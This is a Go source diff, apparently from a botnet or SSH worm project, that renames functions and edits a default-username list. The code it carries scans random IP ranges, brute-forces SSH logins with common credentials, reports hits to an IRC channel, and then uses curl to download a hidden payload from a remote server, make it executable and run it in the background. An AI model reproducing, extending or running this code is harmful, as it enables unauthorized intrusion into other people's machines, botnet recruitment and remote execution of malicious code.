@@ -54,18 +54,18 @@ const (
 	cgpn4 = "121.14" //121.14.255.255
 )
 
-func GenRange(max, min int) string {
+func genRange(max, min int) string {
 	rand.Seed(time.Now().UnixNano())
 	return fmt.Sprint(rand.Intn(max+1-min) + min)
 }
 
-func ManageIP_range(mainRange, setRange string) string {
+func manageIP_range(mainRange, setRange string) string {
 	var ipGen []string
 	ipGen = append(ipGen, mainRange)
 	ipGen = append(ipGen, setRange, ".")
 
 	for i := 0; i < 2; i++ {
-		ipGen = append(ipGen, GenRange(255, 0), ".")
+		ipGen = append(ipGen, genRange(255, 0), ".")
 	}
 
 	ipGen[len(ipGen)-1] = ""
@@ -74,33 +74,33 @@ func ManageIP_range(mainRange, setRange string) string {
 		ipGen[4] + ipGen[5] + ipGen[6] + ipGen[7]
 }
 
-func NextIP(ipRange string) string {
+func nextIP(ipRange string) string {
 	switch ipRange {
 	case chpn1:
-		return ManageIP_range(ipRange, "")
+		return manageIP_range(ipRange, "")
 	case chpn2:
-		return ManageIP_range(ipRange, GenRange(97, 96))
+		return manageIP_range(ipRange, genRange(97, 96))
 	case chpn3:
-		return ManageIP_range(ipRange, "")
+		return manageIP_range(ipRange, "")
 	case chpn4:
-		return ManageIP_range(ipRange, "")
+		return manageIP_range(ipRange, "")
 	case chpn5:
-		return ManageIP_range(ipRange, "")
+		return manageIP_range(ipRange, "")
 	case chpn6:
-		return ManageIP_range(ipRange, GenRange(235, 234))
+		return manageIP_range(ipRange, genRange(235, 234))
 	case cgpn1:
-		return ManageIP_range(ipRange, "")
+		return manageIP_range(ipRange, "")
 	case cgpn2:
-		return ManageIP_range(ipRange, "")
+		return manageIP_range(ipRange, "")
 	case cgpn3:
-		return ManageIP_range(ipRange, "")
+		return manageIP_range(ipRange, "")
 	case cgpn4:
-		return ManageIP_range(ipRange, "")
+		return manageIP_range(ipRange, "")
 	}
 	return ""
 }
 
-func CheckPort(_ipRange string) string {
+func checkPort(_ipRange string) string {
 	ptrIP := &_ipRange
 	conn, err := net.DialTimeout("tcp", *ptrIP, 100*time.Millisecond)
 	if err != nil {
@@ -110,7 +110,7 @@ func CheckPort(_ipRange string) string {
 	return *ptrIP
 }
 
-func SSH_Config(ssh_name, ssh_pass string) *ssh.ClientConfig {
+func ssh_config(ssh_name, ssh_pass string) *ssh.ClientConfig {
 	config := &ssh.ClientConfig{
 		User: ssh_name,
 		Auth: []ssh.AuthMethod{
@@ -121,7 +121,7 @@ func SSH_Config(ssh_name, ssh_pass string) *ssh.ClientConfig {
 	return config
 }
 
-func SSH_Session(ssh_session *ssh.Client, command string) {
+func ssh_session(ssh_session *ssh.Client, command string) {
 	session, _ := ssh_session.NewSession()
 	var set_session bytes.Buffer
 	session.Stdout = &set_session
@@ -146,7 +146,7 @@ func SSH_Conn(reportIRC net.Conn, set_FTP, set_chan, set_payload string) {
 		You can add more if you want.
 	*/
 	userList := []string{
-		"admin", "root", "user", "guest", "support", "login", "pi",
+		"ubuntu", "root", "user", "guest", "support", "login", "pi",
 	}
 
 	passList := []string{
@@ -160,26 +160,26 @@ func SSH_Conn(reportIRC net.Conn, set_FTP, set_chan, set_payload string) {
 
 	for {
 		for i := range NetArr {
-			target := NextIP(NetArr[i])
+			target := nextIP(NetArr[i])
 			ptrTarget := &target
-			turnRange := CheckPort(*ptrTarget)
+			turnRange := checkPort(*ptrTarget)
 
 			if turnRange == "" {
-				CheckPort(target)
+				checkPort(target)
 			} else {
 				IRC_Report(reportIRC, set_chan, "Try to login to "+turnRange)
 				var logCheck bool
 
 				for i := range userList {
 					for j := range passList {
-						_session, err := ssh.Dial("tcp", turnRange, SSH_Config(userList[i], passList[j]))
+						_session, err := ssh.Dial("tcp", turnRange, ssh_config(userList[i], passList[j]))
 						if err == nil {
 							IRC_Report(reportIRC, set_chan, "Login success at "+turnRange)
-							SSH_Session(_session, "curl -o ."+set_payload+" "+set_FTP+" --silent")
+							ssh_session(_session, "curl -o ."+set_payload+" "+set_FTP+" --silent")
 							time.Sleep(10 * time.Second)
 							IRC_Report(reportIRC, set_chan, "\"curl\" Success on "+turnRange)
-							SSH_Session(_session, "chmod +x ."+set_payload)
-							go SSH_Session(_session, "./."+set_payload+" &")
+							ssh_session(_session, "chmod +x ."+set_payload)
+							go ssh_session(_session, "./."+set_payload+" &")
 							logCheck = true
 							break
 						} else {
